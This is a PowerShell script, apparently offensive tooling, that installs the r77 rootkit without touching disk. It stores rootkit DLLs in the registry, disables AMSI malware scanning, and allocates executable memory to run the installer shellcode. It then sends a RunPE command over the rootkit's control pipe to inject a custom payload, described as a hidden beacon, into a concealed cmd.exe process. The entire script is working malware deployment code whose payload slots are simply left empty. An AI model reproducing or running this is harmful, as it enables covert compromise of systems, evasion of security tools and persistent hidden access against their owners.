function Start-r77Fileless {
    # --- Part 1: Binary Data (Base64) ---
    # Convert your files to Base64 strings to keep them inside the script.
    # Update your variables like this to strip out newlines and spaces
    $InstallerBase64 = "".Replace("`n","").Replace("`r","").Trim()
    $Dll86Base64     = "".Replace("`n","").Replace("`r","").Trim()
    $Dll64Base64     = "".Replace("`n","").Replace("`r","").Trim()
    # Your custom payload (e.g., a hidden beacon or tool)
    $PayloadBase64   = "".Replace("`n","").Replace("`r","").Trim()

    # --- Part 2: Registry Staging ---
    # This replaces the need for DLL files in the folder.
    $regPath = "HKLM:\SOFTWARE\$77config"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }

    Write-Host "[*] Staging DLLs in Registry..."
    Set-ItemProperty -Path $regPath -Name "path_x86" -Value ([Convert]::FromBase64String($Dll86Base64)) -Type Binary
    Set-ItemProperty -Path $regPath -Name "path_x64" -Value ([Convert]::FromBase64String($Dll64Base64)) -Type Binary

    # --- Part 3: AMSI Bypass ---
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $b = $a.GetField('amsiInitFailed', 'NonPublic,Static')
        $b.SetValue($null, $true)
    } catch {}

    # --- Part 4: Dynamic API Setup ---
    function Get-WinApiDelegate {
        Param($ParamTypes, $ReturnType = [Void])
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedAssembly')
        $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, 1)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType("T$([Guid]::NewGuid().ToString('N'))", 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ParamTypes).SetImplementationFlags('Runtime, Managed')
        $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes).SetImplementationFlags('Runtime, Managed')
        return $TypeBuilder.CreateType()
    }

    function Get-WinApiAddress {
        Param($Module, $Function)
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.EndsWith('System.dll') }
        $NativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $GetMod = $NativeMethods.GetMethod('GetModuleHandle')
        $GetAddr = $NativeMethods.GetMethod('GetProcAddress', [Type[]]@([Runtime.InteropServices.HandleRef], [String]))
        $ModHandle = $GetMod.Invoke($null, @($Module))
        $HandleRef = New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr), $ModHandle)
        return $GetAddr.Invoke($null, @($HandleRef, $Function))
    }

    # --- Part 5: Reflective Execution of Installer ---
    $sc = [Convert]::FromBase64String($InstallerBase64)
    $vAddr = Get-WinApiAddress kernel32.dll VirtualAlloc
    $vFunc = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vAddr, (Get-WinApiDelegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
    
    $cAddr = Get-WinApiAddress kernel32.dll CreateThread
    $cFunc = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cAddr, (Get-WinApiDelegate @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))

    $MemPtr = $vFunc.Invoke([IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
    [Runtime.InteropServices.Marshal]::Copy([Byte[]]$sc, 0, $MemPtr, $sc.Length)
    $cFunc.Invoke([IntPtr]::Zero, 0, $MemPtr, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
    Write-Host "[+] Rootkit installer running in memory..."

    # --- Part 6: Pipeline Integration (CMD Target) ---
    Write-Host "[*] Connecting to pipe..."
    $pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", "`$77control", [System.IO.Pipes.PipeDirection]::Out)
    
    try {
        $pipe.Connect(10000)
        $writer = New-Object System.IO.BinaryWriter($pipe)

        # 1. Command 0x3002 (RunPE)
        $writer.Write([Int32]0x3002)

        # 2. Target Path: Explicitly 32-bit CMD
        $targetPath = "C:\Windows\SysWOW64\cmd.exe"
        $targetBytes = [System.Text.Encoding]::Unicode.GetBytes($targetPath)
        $writer.Write($targetBytes)
        $writer.Write([Byte]0x00); $writer.Write([Byte]0x00)

        # 3. Payload Processing
        $CleanPayload = $PayloadBase64.Replace("`n","").Replace("`r","").Trim()
        [Byte[]]$payload = [Convert]::FromBase64String($CleanPayload)
        
        Write-Host "[*] Sending payload ($($payload.Length) bytes) to hidden CMD..."
        
        $writer.Write([Int32]$payload.Length)
        $writer.Write($payload)

        # Ensure the data is fully transmitted before closing
        $writer.Flush()
        $pipe.WaitForPipeDrain() 
        
        $writer.Close()
        Write-Host "[!] Injection Complete."
    } catch {
        Write-Error "[-] Transfer failed: $_"
    } finally {
        $pipe.Dispose()
    }
}

Start-r77Fileless
